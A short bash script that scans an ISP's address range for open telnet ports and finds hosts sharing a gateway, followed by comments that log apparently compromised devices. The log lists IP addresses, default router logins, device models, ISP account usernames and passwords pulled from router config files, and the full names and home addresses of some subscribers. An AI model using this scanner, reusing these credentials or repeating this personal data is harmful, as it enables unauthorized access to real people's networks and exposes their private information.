#!/bin/bash

#ppp0      Link encap:Point-to-Point Protocol  
#          inet addr:46.98.20.112  P-t-P:212.115.225.242  Mask:255.255.255.255

# searching neighbor with open 23 port for gateway 212.115.225.242
#GATE="212.115.225.242"
GATE="212.115.225.22"
for i in {1..255}
do
	A=()
	#echo "Start scanning network 46.98.$i.0/24..."
	A=($(nmap 46.98.$i.0/24 -p 23 | grep open -B3 | grep "Nmap scan report for" | awk -F "(" '{print $2}' | sed 's/)//g'))
	#echo "IP-addresses with open 23 port for network 46.98.$i.0/24:"
	#echo ${A[@]}
	for y in "${A[@]}"
	do
		traceroute $y | grep $GATE
		if [ $(echo $?) -eq 0 ]; then
			echo "Neighbor is $y"
		fi
	done
done

###
###Computers are neighbors in the gateway 212.115.225.242
###

#Neighbor is 46.98.2.142
#Neighbor is 46.98.15.178
# Pavlov Dmitriy Fedorovich, Topol-2, 1/10
#Neighbor is 46.98.23.221 (admin/admin) ASUS RT-G32 (t2_pavlovd/ybd1z21g) fregat # grep "password" /tmp/ppp/options.wan0
# Gudym Yaroslav Vladimirovich, str.Combriga Petrova, 4/45
#Neighbor is 46.98.27.19 (admin/admin) ASUS RT-N10 (t3_gydym/8Art8hrO8) fregat # grep "password" /tmp/ppp/options.wan0 
#Neighbor is 46.98.34.119 (admin/admin) w641R ???
#Neighbor is 46.98.39.226 (admin/admin) ASUS RT-N10 (t2_kuznetsova-ev/3slvqzrr)
#Neighbor is 46.98.43.176 (???/???) Cisco Aironet 1250 WAP
#Neighbor is 46.98.50.94 (admin/12345) CCTV Hikvision DS-7204HFI-SH
#Neighbor is 46.98.79.66 (admin/blank password) VoIP adapter D-link DVG-7111S (dnp_97300/???)
#Neighbor is 46.98.88.242 (blank login/???) Draytek Vigor ADSL router telnetd


###
###Computers are neighbors in the gateway 212.115.225.22
###

#Neighbor is 46.98.0.13 (admin/1234) KEENETIC LITE (user_146443/???)
#Neighbor is 46.98.2.188 (admin/???) RT-N10.B1
#Neighbor is 46.98.5.242 (admin/admin) RT-G32 (dln_254575/8x31qcbx)
#Neighbor is 46.98.8.167 (???/???) Mac OS X
#Neighbor is 46.98.13.94 (admin/admin) ASUS RT-G32 (user_122319/4gkgthnl)
#Neighbor is 46.98.15.163 (admin/admin) RT-N10.B1 (user_156877/156877)
#Neighbor is 46.98.16.218 Connection timed out...
#Neighbor is 46.98.17.85 (???/???) TP-LINK_740
#Neighbor is 46.98.19.11 (admin/admin) ASUS WL500G (dln_232107/izuut5nl) ### with telnet!!!
#Neighbor is 46.98.20.64 (admin/Blankpass) MikroTik v6.11
#Neighbor is 46.98.20.154


